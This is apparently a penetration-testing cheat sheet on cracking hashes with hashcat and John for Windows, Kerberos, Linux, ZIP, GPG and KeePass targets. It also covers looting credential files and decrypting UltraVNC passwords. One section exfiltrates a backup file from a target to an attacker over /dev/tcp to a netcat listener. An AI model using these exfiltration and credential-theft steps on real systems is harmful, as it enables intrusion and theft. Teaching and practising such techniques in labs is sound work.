---
title: Hash Crack
type: tool-note
tab: Credentials
tools: [hashcat, john]
inputs: [Hash]
outputs: [Password]
tags: [Credentials, Hash, Crack, Windows, ActiveDirectory]
---

# Hash Crack

## Identify Hashes

#Hash #Crack
Identify a hash type before choosing John or Hashcat mode.

```sh
# Classic interactive helper.
hash-identifier

# haiti.
haiti '<HASH_VALUE>'
haiti --no-color '<HASH_VALUE>'

# name-that-hash.
nth -t '<HASH_VALUE>'
nth -f hash_file.txt
nth -t '<HASH_VALUE>' --hashcat
nth -t '<HASH_VALUE>' --john
```

## Online Crack Check

#Hash #Crack
Quickly check common hashes online when exam/network rules allow it, before spending time on full cracking.

```text
CrackStation: https://crackstation.net
Hashes.com: https://hashes.com/en/decrypt/hash
MD5Decrypt: https://md5decrypt.net

Best for MD5, SHA1, NTLM, and other common-password hashes.
```

## NTLM Family

### NTLM Family - Hashcat Modes

#Hash #Crack #NTLM #Windows
Quick crack reference for LM, NT, NetNTLMv1, and NetNTLMv2 hashes.

```sh
# LM
hashcat -m 3000 -a 0 hash.txt <WORDLIST>
john --format=lm hash.txt --wordlist=<WORDLIST>

# NT
hashcat -m 1000 -a 0 hash.txt <WORDLIST>
john --format=nt hash.txt --wordlist=<WORDLIST>

# NetNTLMv1
hashcat -m 5500 -a 0 hash.txt <WORDLIST>
john --format=netntlm hash.txt --wordlist=<WORDLIST>

# NetNTLMv2
hashcat -m 5600 -a 0 hash.txt <WORDLIST>
john --format=netntlmv2 hash.txt --wordlist=<WORDLIST>
```

### NTLM Family - John Brute Force

#Hash #Crack #NTLM #Windows
Brute-force NT and NetNTLM hashes when wordlists fail.

```sh
# NT hash.
john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt

# NetNTLMv1.
john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt

# NetNTLMv2.
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```

### NTLM Family - NetNTLMv2 Wordlist

#Hash #Crack #NTLM #Windows
Crack NetNTLMv2 with a specific wordlist.

```sh
john --wordlist=<WORDLIST> --format=netntlmv2 hash.txt
hashcat -m 5600 -a 0 hash.txt <WORDLIST>
```

## Kerberos Family

#Hash #Crack #Kerberos #ActiveDirectory
Quick crack reference for Kerberos roast hashes.

```sh
# Kerberoast RC4
hashcat -m 13100 -a 0 hash.txt <WORDLIST>
john --format=krb5tgs hash.txt --wordlist=<WORDLIST>

# Kerberoast AES128
hashcat -m 19600 -a 0 hash.txt <WORDLIST>

# ASREP roast
hashcat -m 18200 -a 0 hash.txt <WORDLIST>

# Timeroast
hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l
```

## Other Windows Hashes

### Other Windows Hashes - MSCache And SCCM PXE

#Hash #Crack #Windows
Crack other Windows-oriented hashes.

```sh
# MSCache v2
hashcat -m 2100 -a 0 hash.txt <WORDLIST>

# SCCM PXE
hashcat -m 19850 -a 0 hash.txt <WORDLIST>
```

### Protected File Hashes - ZIP

#ProtectedFile #Crack
Extract and crack ZIP archive passwords with John.

```sh
zip2john creds.zip > creds.hash
john creds.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Extract with the cracked password.
7z x creds.zip -p<PASS>
```

### Protected File Hashes - Looted Backup ZIP

#ProtectedFile #Crack #Looting #Linux
When you find a readable/writable backup ZIP on a target, copy it locally, crack the archive password, then extract it.

```sh
# Target: find interesting writable/readable backup files.
find / -writable -type f 2>/dev/null | grep -Ev "/proc|/sys|/dev"

# Attacker: receive the file over a raw TCP listener.
nc -lvnp <LPORT> > sitebackup.zip

# Target: send the ZIP back to the attacker.
cat /opt/backup/sitebackup.zip > /dev/tcp/<LHOST>/<LPORT>

# Alternative: copy with SSH if you have credentials.
scp <USER>@<TARGET_IP>:/opt/backup/sitebackup.zip .

# Attacker: crack and extract.
7z x sitebackup.zip
zip2john sitebackup.zip > sitebackup.hash
john sitebackup.hash --wordlist=/usr/share/wordlists/rockyou.txt
7z x sitebackup.zip -p<PASS>
```

### Protected File Hashes - GPG Private Key

#ProtectedFile #PrivateKey #Crack
Crack a passphrase-protected GPG private key, then decrypt the protected file.

```sh
# Copy both the encrypted file and the private key material locally.
scp <USER>@<TARGET_IP>:/path/to/credential.pgp .
scp <USER>@<TARGET_IP>:/path/to/private.asc .

# Crack the private key passphrase.
gpg --import private.asc
gpg2john private.asc > gpg.hash
john gpg.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Import the key and decrypt the protected file using the cracked passphrase.
gpg --import private.asc
gpg --decrypt credential.pgp
```

### Protected File Hashes - KeePass

#ProtectedFile #Crack
Extract and crack KeePass database passwords.

```sh
# Target: find KeePass databases.
dir C:\Users\Administrator /s /b 2>nul | findstr /i "\.kdbx"

# Attacker: crack the KeePass database.
keepass2john Creds.kdbx > keepass.hash
john keepass.hash --wordlist=<WORDLIST>
```

### UltraVNC Password Decrypt

#Hash #Crack #Windows
Decrypt UltraVNC passwords from `ultravnc.ini`.

```sh
# Target: find UltraVNC encrypted password values.
type "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini"

# Attacker: decrypt the DES-encrypted VNC password.
echo -n <VNC_HEX_PASS> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
```

## Linux Hashes

#Hash #Crack #Linux
Crack a copied Linux passwd-style hash offline.

```sh
# Attacker: save the hash line in root.hash.
cat root.hash

# Attacker: crack and show the recovered password.
john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show root.hash
```

## Rules / Mutations

#Hash #Crack
Quick rule-based cracking reference for Hashcat and John.

```sh
# Identify the hash mode first.
hash-identifier

# Helpful built-in rules.
ls /usr/share/hashcat/rules/rockyou-30000.rule
ls /usr/share/john/rules/rockyou-30000.rule

# Custom Hashcat rule example.
echo '$1 $@ $3 $$ $5' > rules1
hashcat -m <MODE> hash.txt <WORDLIST> -r rules1 --potfile-disable

# Add this block to /etc/john/john.conf before using --rules=sshRules.
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@

# Custom John rule example.
john --wordlist=<WORDLIST> --rules=sshRules ssh.hash

# Stronger default Kerberoast mutation pass.
hashcat -m 13100 hashes.kerb <WORDLIST> -r /usr/share/hashcat/rules/best66.rule --force
```
